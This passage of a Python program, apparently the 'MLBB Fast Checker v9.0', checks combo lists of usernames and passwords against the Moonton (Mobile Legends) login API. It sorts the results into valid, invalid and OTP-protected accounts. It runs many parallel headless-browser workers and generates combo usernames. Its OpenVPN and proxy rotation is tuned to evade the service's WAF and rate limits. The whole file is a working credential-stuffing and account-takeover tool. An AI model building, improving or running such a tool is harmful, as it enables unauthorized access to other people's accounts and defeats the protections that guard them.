        await asyncio.gather(*tab_tasks, return_exceptions=True)
        raise
    except Exception as e:
        dbg(f"w{wid} worker crash: {e}")
        for t in tab_tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tab_tasks, return_exceptions=True)
        if combo_q.pending > 0:
            raise
    finally:
        await _close_ctx()

# ── Interactive CLI Menu (checker.js style) ──────────────────────────────────
def ask(label: str, default: str = '') -> str:
    d = f" {c(GRAY)}[{default}]{W}" if default else ''
    try:
        v = input(f"  {c(CYAN)}{S_ASK}{W} {label}{d} {c(GRAY)}{S_YN}{W} ").strip().strip('"').strip("'")
    except EOFError:
        v = ''
    return v or default

def ask_yn(label: str, default: str = 'y') -> bool:
    while True:
        try:
            r = input(f"  {c(CYAN)}{S_YN}{W} {label} {c(GRAY)}(y/n){W}  {c(PURPLE)}{S_YN}{W} ").strip().lower()
        except EOFError:
            r = ''
        if not r:
            return default in ('y', 'yes')
        if r in ('y', 'yes'):
            return True
        if r in ('n', 'no'):
            return False

def _count_ovpn_files(d: str) -> int:
    if not d or not os.path.isdir(d):
        return 0
    return sum(1 for fn in os.listdir(d) if fn.lower().endswith('.ovpn') and os.path.isfile(os.path.join(d, fn)))

def _has_ovpn_auth(d: str) -> bool:
    return any(os.path.isfile(os.path.join(d, fn)) for fn in ('auth.txt', 'pass.txt', 'credentials.txt'))

def _discover_ovpn_dirs(base_dir: str = BASE) -> list[tuple[str, str, int]]:
    """Temukan folder berisi *.ovpn (vpns/, vpns/<provider>/, serta subfolder root seperti vpn-proton/)."""
    out: list[tuple[str, str, int]] = []
    seen: set[str] = set()
    skip = {'input', 'output', '__pycache__'}
    def _add(label: str, path: str):
        ap = os.path.abspath(path)
        if ap in seen:
            return
        cnt = _count_ovpn_files(ap)
        if cnt > 0:
            seen.add(ap)
            out.append((label, ap, cnt))
    _add('vpns', os.path.join(base_dir, 'vpns'))
    try:
        top_entries = sorted(os.listdir(base_dir))
    except OSError:
        top_entries = []
    for name in top_entries:
        if name.startswith('.') or name in skip:
            continue
        p = os.path.join(base_dir, name)
        if not os.path.isdir(p):
            continue
        if name == 'vpns':
            try:
                for sub in sorted(os.listdir(p)):
                    if not sub.startswith('.'):
                        _add(f"vpns/{sub}", os.path.join(p, sub))
            except OSError:
                pass
        else:
            _add(name, p)
    return out

def _resolve_ovpn_dir_input(raw: str, base_dir: str = BASE) -> str:
    s = (raw or '').strip().strip('"').strip("'")
    if not s:
        return ''
    if os.path.isabs(s):
        return s
    in_base = os.path.join(base_dir, s)
    return in_base if os.path.isdir(in_base) else os.path.abspath(s)

def _detect_vps_hw() -> dict:
    """Deteksi cepat kapasitas CPU & RAM bebas (memperhitungkan limit cgroup LXC/Docker)."""
    cpus = float(os.cpu_count() or 2)
    avail_mb = 2048.0
    total_mb = 2048.0
    swap_mb = 2048.0 if os.name == 'nt' else 0.0
    if os.name == 'nt':
        try:
            import ctypes
            class _MEMSTAT(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong), ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong), ('ullAvailPhys', ctypes.c_ulonglong),
                    ('ullTotalPageFile', ctypes.c_ulonglong), ('ullAvailPageFile', ctypes.c_ulonglong),
                    ('ullTotalVirtual', ctypes.c_ulonglong), ('ullAvailVirtual', ctypes.c_ulonglong),
                    ('ullAvailExtendedVirtual', ctypes.c_ulonglong),
                ]
            ms = _MEMSTAT()
            ms.dwLength = ctypes.sizeof(ms)
            if ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(ms)):
                total_mb = ms.ullTotalPhys / 1048576.0
                avail_mb = ms.ullAvailPhys / 1048576.0
        except Exception:
            pass
    else:
        try:
            with open('/proc/meminfo', 'r', encoding='utf-8', errors='ignore') as f:
                mi = {}
                for ln in f:
                    k, _, v = ln.partition(':')
                    num = v.strip().split()[0] if v.strip() else '0'
                    if num.isdigit():
                        mi[k] = int(num) / 1024.0
                if mi.get('MemTotal'):
                    total_mb = mi['MemTotal']
                avail_mb = mi.get('MemAvailable') or (mi.get('MemFree', 0) + mi.get('Buffers', 0) + mi.get('Cached', 0)) or total_mb
                swap_mb = mi.get('SwapTotal', 0.0)
        except Exception:
            pass
        # Hormati limit cgroup (Proxmox LXC / Docker) bila lebih kecil dari /proc
        for c_max_p, c_cur_p in (
            ('/sys/fs/cgroup/memory.max', '/sys/fs/cgroup/memory.current'),
            ('/sys/fs/cgroup/memory/memory.limit_in_bytes', '/sys/fs/cgroup/memory/memory.usage_in_bytes'),
        ):
            try:
                if os.path.isfile(c_max_p):
                    raw_m = open(c_max_p, encoding='ascii').read().strip()
                    if raw_m.isdigit():
                        lim_mb = int(raw_m) / 1048576.0
                        if 64.0 < lim_mb < total_mb * 1.1:
                            total_mb = min(total_mb, lim_mb)
                            if os.path.isfile(c_cur_p):
                                cur_mb = int(open(c_cur_p, encoding='ascii').read().strip()) / 1048576.0
                                avail_mb = min(avail_mb, max(0.0, lim_mb - cur_mb))
                    break
            except Exception:
                pass
        try:
            if os.path.isfile('/sys/fs/cgroup/cpu.max'):
                parts = open('/sys/fs/cgroup/cpu.max', encoding='ascii').read().strip().split()
                if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit() and int(parts[1]) > 0:
                    cpus = min(cpus, max(0.5, int(parts[0]) / int(parts[1])))
            elif os.path.isfile('/sys/fs/cgroup/cpu/cpu.cfs_quota_us') and os.path.isfile('/sys/fs/cgroup/cpu/cpu.cfs_period_us'):
                q = int(open('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', encoding='ascii').read().strip())
                p = int(open('/sys/fs/cgroup/cpu/cpu.cfs_period_us', encoding='ascii').read().strip())
                if q > 0 and p > 0:
                    cpus = min(cpus, max(0.5, q / p))
        except Exception:
            pass
    no_swap = (os.name != 'nt' and swap_mb < 64.0)
    ram_cap = max(1, int(max(0.0, avail_mb - (600.0 if no_swap else 450.0)) / (185.0 if no_swap else 160.0)))
    cpu_cap = max(2, int(round(cpus * 2.5)))
    hw_max = max(1, min(24, ram_cap, cpu_cap))
    if _PLAT['is_android']:
        hw_max = min(hw_max, 6)
    return {'cpus': round(cpus, 1), 'total_mb': int(total_mb), 'avail_mb': int(avail_mb), 'hw_max': hw_max, 'no_swap': no_swap}

def _read_linux_cpu_ticks() -> tuple[int, int] | None:
    """Baca (total_ticks, steal_ticks) dari /proc/stat Linux untuk deteksi VPS oversubscribed."""
    if os.name == 'nt':
        return None
    try:
        with open('/proc/stat', 'r', encoding='ascii', errors='ignore') as f:
            parts = f.readline().split()
        if len(parts) >= 9 and parts[0] == 'cpu':
            vals = [int(x) for x in parts[1:11] if x.isdigit()]
            if len(vals) >= 8:
                return sum(vals), vals[7]
    except Exception:
        pass
    return None

def _calc_auto_safe_cap(cpus: float, avail_mb: float, t1_js_ms: float, steal_pct: float = 0.0, no_swap: bool = False) -> int:
    """Hitung batas worker aman berbasis kecepatan pure V8+DOM nyata (ms), CPU steal, & RAM tanpa swap."""
    res_mb, per_ctx_mb = (600.0, 185.0) if no_swap else (450.0, 160.0)
    ram_cap = max(1, int(max(0.0, avail_mb - res_mb) / per_ctx_mb)) if avail_mb > 0 else 8
    if steal_pct >= 10.0 or t1_js_ms >= 250.0:
        mult = 1.0   # DO / Xeon lambat atau host oversubscribed
    elif steal_pct >= 4.0 or t1_js_ms >= 175.0:
        mult = 1.5
    else:
        mult = 2.5   # EPYC / Ryzen modern
    cap = max(2, int(round(cpus * mult)))
    if _PLAT['is_android']:
        cap = min(cap, 6)
    return max(1, min(24, ram_cap, cap))

async def _benchmark_vps_capacity(browser, hw: dict | None = None, choose_two_tab: bool = True) -> tuple[int, bool, int, str]:
    """Benchmark Chromium nyata (pure V8+DOM compute tanpa sleep) + Linux steal + anti-OOM DO."""
    hw = hw or _detect_vps_hw()
    cpus = max(0.5, float(hw['cpus']))
    avail_mb = float(hw['avail_mb'])
    no_swap = bool(hw.get('no_swap', False))
    if browser is None:
        fallback_n = min(4, max(1, int(hw['hw_max'])))
        return fallback_n, False, fallback_n, f"Estimasi CPU/RAM: {cpus} vCPU · {avail_mb/1024:.1f} GB RAM -> {fallback_n}w"

    _WORK_JS = (
        "() => {"
        " const t0 = performance.now();"
        " const f = document.createElement('div');"
        " f.innerHTML = '<input type=\"text\"><input type=\"password\"><button>OK</button>';"
        " document.body.appendChild(f);"
        " let h = 2166136261, s = 'mlbb';"
        " for (let i = 0; i < 1200; i++) {"
        "   f.firstChild.value = String(i);"
        "   void f.offsetHeight;"
        "   s = btoa(s.slice(0, 16) + (h & 255));"
        "   for (let j = 0; j < 400; j++) h = Math.imul(h ^ ((i + j) & 255), 16777619);"
        " }"
        " return performance.now() - t0;"
        "}"
    )

    async def _one_probe() -> tuple[float, float]:
        c_tmp = None
        t_s = time.perf_counter()
        try:
            c_tmp = await asyncio.wait_for(browser.new_context(), timeout=8.0)
            p_tmp = await asyncio.wait_for(c_tmp.new_page(), timeout=6.0)
            js_ms = float(await asyncio.wait_for(p_tmp.evaluate(_WORK_JS), timeout=6.0) or 0.0)
            return time.perf_counter() - t_s, js_ms
        finally:
            if c_tmp is not None:
                try:
                    await asyncio.wait_for(c_tmp.close(), timeout=4.0)
                except Exception:
                    pass

    # Warmup context & ukur baseline single-context (wall + pure V8/DOM ms)
    t1, t1_js = 0.45, 220.0
    try:
        dt_a, js_a = await _one_probe()
        dt_b, js_b = await _one_probe()
        t1 = max(0.08, min(dt_a, dt_b))
        t1_js = max(20.0, min(js_a, js_b))
    except Exception:
        pass

    safe_cap = _calc_auto_safe_cap(cpus, avail_mb, t1_js, steal_pct=0.0, no_swap=no_swap)
    levels = sorted({v for v in (2, 4, 6, 8, 10, 12, 16, 20, safe_cap) if 2 <= v <= safe_cap})
    if not levels:
        levels = [1]

    best_n = 1
    best_tp = 1.0 / max(t1, 0.08)
    last_steal = 0.0
    ram_stop_mb = 520 if no_swap else 380

    for n in levels:
        st0 = _read_linux_cpu_ticks()
        t0 = time.perf_counter()
        res = await asyncio.gather(*(_one_probe() for _ in range(n)), return_exceptions=True)
        dt = max(0.05, time.perf_counter() - t0)
        st1 = _read_linux_cpu_ticks()
        if st0 and st1 and st1[0] > st0[0]:
            last_steal = max(0.0, (st1[1] - st0[1]) * 100.0 / (st1[0] - st0[0]))
            safe_cap = min(safe_cap, _calc_auto_safe_cap(cpus, avail_mb, t1_js, steal_pct=last_steal, no_swap=no_swap))
            if n > safe_cap:
                break
        ok_res = [r for r in res if not isinstance(r, BaseException)]
        if len(ok_res) < n:
            break
        max_js = max((r[1] for r in ok_res), default=t1_js)
        tp = len(ok_res) / dt
        if dt > max(0.55, t1 * 2.2) or max_js > max(260.0, t1_js * 2.0):
            break
        if tp < best_tp * 1.15:
            break
        if last_steal >= 10.0:
            break
        if _detect_vps_hw()['avail_mb'] < ram_stop_mb:
            break
        best_n, best_tp = n, tp

    slow_host = t1_js >= 240.0 or last_steal >= 8.0 or no_swap
    headroom_max = min(safe_cap, best_n + (1 if (safe_cap > best_n and slow_host) else (2 if safe_cap > best_n else 0)))
    # 2-tab hanya bila CPU cepat & RAM cukup longgar
    two_t = bool(choose_two_tab and best_n <= 4 and t1_js <= 175.0 and last_steal < 4.0 and avail_mb >= 1200)
    steal_str = f" steal:{last_steal:.0f}%" if last_steal >= 1.0 else ""
    tier = "lambat/oversub" if (t1_js >= 250.0 or last_steal >= 10.0) else ("sedang" if t1_js >= 175.0 else "cepat")
    swap_str = " no-swap" if no_swap else ""
    summary = (
        f"Auto Worker: {cpus} vCPU ({tier}, V8:{int(t1_js)}ms{steal_str}) · "
        f"{avail_mb/1024:.1f}GB{swap_str} -> {best_n} ctx x {2 if two_t else 1} tab (max {headroom_max}w)"
    )
    return best_n, two_t, headroom_max, summary

# ── Main Entrypoint ──────────────────────────────────────────────────────────
async def async_main():
    pa = argparse.ArgumentParser(description='MLBB Fast Checker v9.0 VPN — Cross-Platform (Termux/Linux/Windows)')
    pa.add_argument('combo', nargs='?', default='')
    pa.add_argument('--workers', type=str, default='', help='Jumlah worker (1-30 atau "auto" untuk uji kapasitas VPS)')
    pa.add_argument('--headless', dest='headless', action='store_true', default=None)
    pa.add_argument('--no-headless', dest='headless', action='store_false', default=None)
    pa.add_argument('--debug', action='store_true')
    pa.add_argument('--out', type=str, default='')
    pa.add_argument('--no-prompt', action='store_true')
    pa.add_argument('--proxy-file', type=str, default='')
    pa.add_argument('--no-proxy', action='store_true', default=False)
    pa.add_argument('--vpn-cmd', type=str, default='', help='Perintah shell rotasi VPN otomatis saat WAF/RATE')
    pa.add_argument('--vpn-ovpn-dir', type=str, default='', help='Folder berisi file *.ovpn untuk auto-rotate OpenVPN (Windows/Linux)')
    pa.add_argument('--vpn-ovpn-auth', type=str, default='', help='File auth OpenVPN (2 baris: user & pass; default auto-deteksi auth.txt)')
    pa.add_argument('--skip-ovpn-test', action='store_true', help='Lewati pre-test .ovpn ke API Moonton di awal')
    pa.add_argument('--retest-ovpn', action='store_true', help='Paksa uji ulang semua .ovpn (abaikan cache 6 jam)')
    pa.add_argument('--test-ovpn-only', action='store_true', help='Uji semua file .ovpn ke API Moonton lalu keluar')
    pa.add_argument('--vpn-wait', action='store_true', help='Pause & tunggu exit IP berubah saat ganti server VPN manual')
    pa.add_argument('--vpn-waf-threshold', type=int, default=5, help='Jumlah WAF/RATE beruntun sebelum jeda/rotasi VPN')
    pa.add_argument('--waf-cooldown', type=float, default=25.0, help='Detik jeda cooldown VPN saat WAF threshold tercapai')
    pa.add_argument('--vpn-rotate-every', type=int, default=0, help='Rotasi/jeda VPN proaktif tiap N akun')
    pa.add_argument('--no-vpn-ip-check', action='store_true', help='Lewati cek public IP VPN')
    pa.add_argument('--license-key', type=str, default='')
    pa.add_argument('--two-tab', action='store_true', default=False)
    pa.add_argument('--ascii', action='store_true', help='Paksa UI pure ASCII (tanpa Unicode box drawing)')
    pa.add_argument('--selftest', action='store_true')
    args = pa.parse_args()

    # Selftest block
    if args.selftest:
        print("[*] Running built-in self-tests...")
        # 1. Crypto test
        assert decrypt_payload('52tIWV2NVCdzwLNUYKIrSbpalhAnYRFm8UIZ5iEyGXIL') != ''
        # 2. Classify test
        assert classify({'code': 0}) == 'VALID'
        assert classify({'code': False}) == 'UNKNOWN'
        assert classify({'code': 1002, 'message': 'PasswdError'}) == 'INVALID'
        assert classify({'code': 1086}) == 'OTP'
        assert classify({'code': 1036}) == 'RATE'
        assert classify(None) == 'WAF'
        assert classify({'__waf': True}) == 'WAF'
        # 3. Combo gen test
        names = load_names()
        assert len(names) >= 60
        u, _ = random_username(names)
        assert len(u) >= 2
        # 4. Proxy parse & Platform & VPN coordinator test
        p = parse_proxy('user:pass@1.2.3.4:8080')
        assert p and p['username'] == 'user'
        p2 = parse_proxy('1.2.3.4:8080:u2:p2')
        assert p2 and p2['username'] == 'u2'
        plat = _detect_platform()
        assert plat['tag'] in ('Windows', 'Termux-Native', 'Termux-Proot', 'Linux')
        vc = VpnCoordinator(waf_threshold=2, waf_cooldown=3.0, ip_check=False)
        assert vc.consec_waf_rate == 0 and vc.label() == 'VPN · Direct' and not vc.ovpn_started
        linux_cmd = vc._build_ovpn_cmd('/tmp/test.ovpn', 12345, is_win=False)
        assert linux_cmd.index('--ignore-unknown-option') < linux_cmd.index('--config')
        assert vc._parse_linux_default_route("default via 10.0.0.1 dev tun0\ndefault via 192.168.1.1 dev eth0 proto static\n") == ('eth0', '192.168.1.1')
        import tempfile
        with tempfile.TemporaryDirectory() as _td:
            vc.ovpn_dir = _td
            _fp = os.path.join(_td, 'a.ovpn')
            open(_fp, 'w').write('client\n')
            vc._save_probe_cache({
                'a.ovpn': {'sig': vc._ovpn_sig(_fp), 'ts': time.time(), 'ok': True, 'ms': 123},
                'stale.ovpn': {'sig': [1, 1], 'ts': time.time() - 30000.0, 'ok': True, 'ms': 50},
            })
            _lc = vc._load_probe_cache(ttl_s=21600.0)
            assert 'a.ovpn' in _lc and 'stale.ovpn' not in _lc
            for _pd in ('vpns', 'vpn-proton', 'vpn-surfshark', 'vpns/hma'):
                _pdir = os.path.join(_td, *_pd.split('/'))
                os.makedirs(_pdir, exist_ok=True)
                open(os.path.join(_pdir, 'node.ovpn'), 'w').write('client\n')
            _disc = _discover_ovpn_dirs(_td)
            assert [lbl for lbl, _, _ in _disc] == ['vpns', 'vpn-proton', 'vpn-surfshark', 'vpns/hma'], _disc
        vc.ovpn_dir = ''
        # 5. Smart stability: UDP-first + group cooldown, intermittent WAF & persistent session_peak auto-heal
        vc.ovpn_files = ['mm_udp.ovpn', 'mm_tcp.ovpn', 'sg_tcp.ovpn', 'sg_udp.ovpn']
        vc.ovpn_idx = 0
        vc.cur_ovpn_cfg = 'mm_udp.ovpn'
        vc._penalize_current_ovpn()
        assert vc._pick_next_ovpn() == 'sg_udp.ovpn'
        vc.consec_waf_rate = 0
        vc._recent_outcomes.clear()
        for idx_o in range(16):
            if idx_o in (3, 7, 11):
                vc.record_ok()
            else:
                vc.consec_waf_rate = 0
                vc._recent_outcomes.append(False)
        assert vc._waf_tripped(), "Intermittent WAF (81%) must trip rotation even if record_ok resets consec_waf_rate"
        sd_t = _SpeedDetector()
        sd_t.reset(now_t=100.0)
        for i in range(60):
            sd_t.mark_check(now_t=100.0 + i * 0.34)
        assert sd_t.session_peak >= 2.5
        for k_r in range(5):
            sd_t.resume(now_t=125.0 + k_r)
        assert sd_t.session_peak >= 2.5
        for i in range(12):
            sd_t.mark_check(now_t=140.0 + i * 1.0)
        sd_t.record_stall('waf', 4.0, now_t=151.0)
        assert not sd_t.should_auto_heal(now_t=145.0)[0]
        assert sd_t.should_auto_heal(now_t=161.0)[0]
        _hw = _detect_vps_hw()
        assert _hw['cpus'] > 0 and _hw['total_mb'] > 0
        # Uji akurat CPU/RAM DO: Xeon lambat (t1_js=310ms) atau steal >=10% dibatasi <=4 worker di 4 vCPU
        assert _calc_auto_safe_cap(4.0, 2200.0, 310.0, steal_pct=0.0, no_swap=True) <= 4
        assert _calc_auto_safe_cap(4.0, 8192.0, 120.0, steal_pct=12.0) <= 4
        assert _calc_auto_safe_cap(4.0, 8192.0, 120.0, steal_pct=0.0) == 10
        class _FakePage:
            async def evaluate(self, js):
                await asyncio.sleep(0.02)
                return 120.0
        class _FakeCtx:
            async def new_page(self): return _FakePage()
            async def close(self): return None
        class _FakeBrowser:
            async def new_context(self): return _FakeCtx()
        _bw, _b2t, _bhmax, _bmsg = await _benchmark_vps_capacity(_FakeBrowser(), hw={'cpus': 4.0, 'total_mb': 8192, 'avail_mb': 6000, 'hw_max': 10, 'no_swap': False}, choose_two_tab=True)
        assert 1 <= _bw <= _bhmax <= 10 and 'Auto Worker:' in _bmsg
        # 6. Unified SmartController brain (no worker scale-down, adaptive timeout, plateau calibration, node reputation)
        sc = SmartController()
        sc.reset(now_t=100.0)
        sc.configure_workers(min_w=2, start_w=6, max_w=10, auto_scale=True, now_t=100.0)
        assert sc.adaptive_wait_s(False) == 3.5 and sc.adaptive_wait_s(True) == 8.5
        for _ in range(10):
            sc.on_outcome('OK', resp_dt=2.0, now_t=105.0)
        assert 4.5 <= sc.adaptive_wait_s(True) <= 5.5
        # Low RAM never scales down workers anymore
        act, _ = sc.decide_action(avail_mb=300.0, can_rotate_vpn=True, ctx_age=10, is_recycling=False, now_t=125.0)
        assert act == 'NONE' and sc.target_workers == 6, (act, sc.target_workers)
        for i_c in range(30):
            sc.mark_check(now_t=116.0 + i_c * 1.0)
        act_up, info_up = sc.decide_action(avail_mb=2000.0, can_rotate_vpn=True, ctx_age=10, is_recycling=False, now_t=145.0)
        assert act_up == 'SCALE_UP' and info_up['new_w'] == 7, (act_up, info_up)
        await sc.set_target_workers(7, 'UP', now_t=145.0)
        sc.mark_worker_dead(1)
        assert sc.live_workers() == 6 and stats['workers'] == 6
        sc.dead_workers.clear()
        # High WAF on 1-IP VPN rotates VPN rather than reducing worker count
        sc_w = SmartController()
        sc_w.reset(now_t=10.0)
        sc_w.configure_workers(min_w=2, start_w=12, max_w=12, auto_scale=True, now_t=10.0)
        for j in range(16):
            sc_w.on_outcome('WAF' if j < 12 else 'OK', resp_dt=1.5, now_t=40.0 + j * 0.5)
        act_w, _ = sc_w.decide_action(avail_mb=3000.0, can_rotate_vpn=True, ctx_age=50, is_recycling=False, now_t=56.0)
        assert act_w == 'ROTATE_VPN' and sc_w.target_workers == 12, (act_w, sc_w.target_workers)
        assert _vpnpool_slot_from_proxy({'server': 'socks5://10.200.4.2:1080'}) == 4
        assert _vpnpool_slot_from_proxy({'server': 'http://1.2.3.4:8080'}) == 0
        # Gate wait_for_slot wakes when target_workers scales up
        await sc.set_target_workers(4, 'DN')
        async def _wake_up():
            await asyncio.sleep(0.05)
            await sc.set_target_workers(6, 'UP')
        _wt = asyncio.create_task(_wake_up())
        assert await sc.wait_for_slot(4, lambda: False)
        await _wt
        # Plateau calibration lowers stale inflated session_peak after 3 healthy slower nodes
        sc2 = SmartController()
        sc2.reset(now_t=10.0)
        sc2.session_peak = 3.0
        for n_i in range(3):
            base_t = 20.0 + n_i * 30.0
            sc2.node_start_t = base_t
            sc2.node_checks = 15
            sc2.node_waf = 0
            sc2.node_tmo = 0
            sc2.stalls.clear()
            sc2.resume(now_t=base_t + 20.0)
        assert sc2.session_peak < 3.0, sc2.session_peak
        # Persistent VPN node reputation ranking
        with tempfile.TemporaryDirectory() as _td2:
            vc_rep = VpnCoordinator(waf_threshold=2, waf_cooldown=3.0, ip_check=False)
            vc_rep.ovpn_dir = _td2
            vc_rep.ovpn_files = [os.path.join(_td2, 'sg_udp.ovpn'), os.path.join(_td2, 'nl_udp.ovpn')]
            vc_rep.record_node_perf(vc_rep.ovpn_files[0], rate=0.6, waf_ratio=0.4)
            vc_rep.record_node_perf(vc_rep.ovpn_files[1], rate=2.8, waf_ratio=0.02)
            vc_rep2 = VpnCoordinator(waf_threshold=2, waf_cooldown=3.0, ip_check=False)
            vc_rep2.ovpn_dir = _td2
            vc_rep2.node_scores = vc_rep2._load_node_scores()
            vc_rep2.ovpn_files = list(vc_rep.ovpn_files)
            assert vc_rep2.node_score(vc_rep.ovpn_files[1]) > vc_rep2.node_score(vc_rep.ovpn_files[0])
            assert vc_rep2._pick_next_ovpn().endswith('nl_udp.ovpn')
            # Penalizing failing node puts it on cooldown so _pick_next_ovpn switches to sg_udp.ovpn
            vc_rep2.cur_ovpn_cfg = vc_rep.ovpn_files[1]
            vc_rep2._penalize_current_ovpn()
            assert vc_rep2.node_score(os.path.join(_td2, 'unseen_udp.ovpn')) == 0.0
            vc_rep2.ovpn_penalties[vc_rep2._ovpn_group_key(os.path.join(_td2, 'unseen_udp.ovpn'))] = 1
            assert vc_rep2.node_score(os.path.join(_td2, 'unseen_udp.ovpn')) < 0.0
            assert vc_rep2._pick_next_ovpn().endswith('sg_udp.ovpn')
        vc.ovpn_files = []
        vc.ovpn_failed = True
        try:
            await vc.ensure_ovpn_alive(None, stats)
            raise AssertionError("ensure_ovpn_alive must fail when ovpn_failed=True")
        except RuntimeError:
            pass
        print("[✓] All self-tests passed successfully!")
        return

    global DEBUG, HEADLESS, NUM_CONTEXTS, TWO_TAB, PROXY_ENABLED, PROXY_FILE, OUTPUT_DIR, _TUI_ACTIVE, _pw_instance, _driver_pid, _lookup_exec
    TWO_TAB = bool(args.two_tab)
    auto_two_tab = False

    if args.test_ovpn_only:
        ovpn_dir_t = args.vpn_ovpn_dir
        if not ovpn_dir_t:
            _d_list = _discover_ovpn_dirs(BASE)
            if len(_d_list) > 1 and _IS_TTY:
                print(f"  {c(CYAN)}Daftar folder OpenVPN:{W}")
                for idx_d, (lbl_d, path_d, cnt_d) in enumerate(_d_list, 1):
                    auth_tag = f" {c(GREEN)}auth✓{W}" if _has_ovpn_auth(path_d) else ""
                    print(f"    {c(WHITE)}[{idx_d}]{W} {lbl_d} {c(GRAY)}({cnt_d} .ovpn){W}{auth_tag}")
                sel = ask(f"Pilih folder VPN untuk diuji (1-{len(_d_list)} / path)", "1")
                ovpn_dir_t = _d_list[int(sel) - 1][1] if (sel.isdigit() and 1 <= int(sel) <= len(_d_list)) else _resolve_ovpn_dir_input(sel)
            elif _d_list:
                ovpn_dir_t = _d_list[0][1]
        if not ovpn_dir_t:
            p_out(f"{c(RED)}[!] Berikan --vpn-ovpn-dir <folder>{W}")
            return
        vc_t = None
        try:
            vc_t = VpnCoordinator(
                ip_check=not bool(args.no_vpn_ip_check),
                ovpn_dir=ovpn_dir_t, ovpn_auth=args.vpn_ovpn_auth,
            )
            await vc_t.probe_ovpns(use_cache=False)
        except RuntimeError as ve:
            p_out(f"{c(RED)}[!] {ve}{W}")
        finally:
            if vc_t is not None:
                await vc_t.stop_ovpn()
                await vc_t.restore_warp_if_needed()
        return

    combo_path = ''
    _w_raw = str(args.workers or '').strip().lower()
    auto_workers = (_w_raw == 'auto')
    _w_arg = int(_w_raw) if _w_raw.isdigit() else 0
    workers = 2 if _PLAT['is_android'] else 4
    hw_info = _detect_vps_hw()
    vpn_cmd = args.vpn_cmd
    vpn_wait = bool(args.vpn_wait)
    waf_cooldown = max(3.0, float(args.waf_cooldown))
    vpn_waf_threshold = max(1, int(args.vpn_waf_threshold))
    vpn_rotate_every = max(0, int(args.vpn_rotate_every))
    vpn_ip_check = not bool(args.no_vpn_ip_check)
    ovpn_dir = (args.vpn_ovpn_dir or '').strip()
    skip_ovpn_test = bool(args.skip_ovpn_test)
    multi_vpn_slots = 0
    multi_vpn_dir = ''
    multi_vpn_sh = ''
    multi_vpn_started = False
    _VPNPOOL_CFG.update({'sh': '', 'lock': None, 'cooldown': {}})

    if args.out:
        OUTPUT_DIR = os.path.abspath(args.out) if os.path.isabs(args.out) else os.path.join(BASE, args.out)

    if args.no_prompt or (args.combo and (_w_arg > 0 or auto_workers)):
        combo_path = args.combo or os.path.join(BASE, 'combo.txt')
        default_w = 2 if _PLAT['is_android'] else 4
        if auto_workers:
            workers = hw_info['hw_max']
            auto_two_tab = not bool(args.two_tab)
        else:
            workers = max(1, min(30, _w_arg or default_w))
        HEADLESS = args.headless if args.headless is not None else True
        DEBUG = args.debug
        if args.proxy_file:
            PROXY_ENABLED = True
            if os.path.exists(args.proxy_file):
                PROXY_FILE = os.path.abspath(args.proxy_file)
            elif os.path.exists(os.path.join(BASE, 'input', args.proxy_file)):
                PROXY_FILE = os.path.join(BASE, 'input', args.proxy_file)
            elif os.path.exists(os.path.join(BASE, args.proxy_file)):
                PROXY_FILE = os.path.join(BASE, args.proxy_file)
            elif os.path.exists(os.path.join(PROJECT_ROOT, args.proxy_file)):
                PROXY_FILE = os.path.join(PROJECT_ROOT, args.proxy_file)
            else:
                PROXY_FILE = os.path.abspath(args.proxy_file)
        else:
            PROXY_ENABLED = False
    else:
        ovpn_dirs = _discover_ovpn_dirs(BASE)
        if ovpn_dir:
            _ov_resolved = _resolve_ovpn_dir_input(ovpn_dir)
            avail_ovpn = _count_ovpn_files(_ov_resolved)
            _folder_info = f"{avail_ovpn} .ovpn siap"
        else:
            avail_ovpn = sum(cnt for _, _, cnt in ovpn_dirs)
            _folder_info = f"{avail_ovpn} .ovpn · {len(ovpn_dirs)} folder"
        if _IS_TTY:
            os.system("cls" if os.name == "nt" else "clear")
        _sub_hdr = (
            f"OpenVPN Auto-Rotate ({_folder_info})" if avail_ovpn > 0
            else "Direct / External VPN Mode"
        )
        _print_box("", [
            f"  {c(WHITE)}{BD}* MLBB FAST CHECKER v9.0 OPENVPN *{W}",
            f"  {c(GRAY)}Platform: {_PLAT['tag']} ({_PLAT['arch']}) - {_sub_hdr}{W}",
        ], bc=CYAN)
        input_dir = os.path.join(BASE, 'input')
        default_combo = os.path.join(input_dir, 'combo.txt')
        if not os.path.exists(default_combo) and os.path.isdir(input_dir):
            cand_inputs = [
                os.path.join(input_dir, fn) for fn in os.listdir(input_dir)
                if os.path.isfile(os.path.join(input_dir, fn)) and 'prox' not in fn.lower() and not fn.startswith('.')
            ]
            if cand_inputs:
                default_combo = max(cand_inputs, key=os.path.getmtime)
        if not os.path.exists(default_combo):
            default_combo = os.path.join(PROJECT_ROOT, 'Base', 'combo.txt')
        if not os.path.exists(default_combo):
            default_combo = os.path.join(BASE, 'combo.txt')
        combo_path = ask("Combo file ", default_combo)
        if not os.path.isabs(combo_path):
            for cand in (os.path.join(BASE, 'input', combo_path), os.path.join(BASE, combo_path)):
                if os.path.exists(cand):
                    combo_path = cand
                    break

        rec_w = 2 if _PLAT['is_android'] else 4
        workers_str = ask("Worker threads (1-30 / auto)", "auto").strip().lower()
        if workers_str in ('', 'auto', 'a'):
            auto_workers = True
            workers = hw_info['hw_max']
            _tt_ans = ask("2-tab extra worker? (y/n/auto)", "y" if args.two_tab else "auto").strip().lower()
            if _tt_ans in ('y', 'yes'):
                TWO_TAB = True
                auto_two_tab = False
            elif _tt_ans in ('n', 'no'):
                TWO_TAB = False
                auto_two_tab = False
            else:
                auto_two_tab = True
        else:
            auto_workers = False
            workers = max(1, min(30, int(workers_str) if workers_str.isdigit() else rec_w))
            TWO_TAB = ask_yn("2-tab extra worker? (2 tab/context, lebih cepat)", default='y' if args.two_tab else 'n')
        HEADLESS = True if args.headless is None else args.headless
        DEBUG = bool(args.debug)
        PROXY_ENABLED = False
        if args.proxy_file:
            PROXY_ENABLED = True
            if os.path.exists(args.proxy_file):
                PROXY_FILE = os.path.abspath(args.proxy_file)
            elif os.path.exists(os.path.join(BASE, 'input', args.proxy_file)):
                PROXY_FILE = os.path.join(BASE, 'input', args.proxy_file)
            elif os.path.exists(os.path.join(BASE, args.proxy_file)):
                PROXY_FILE = os.path.join(BASE, args.proxy_file)
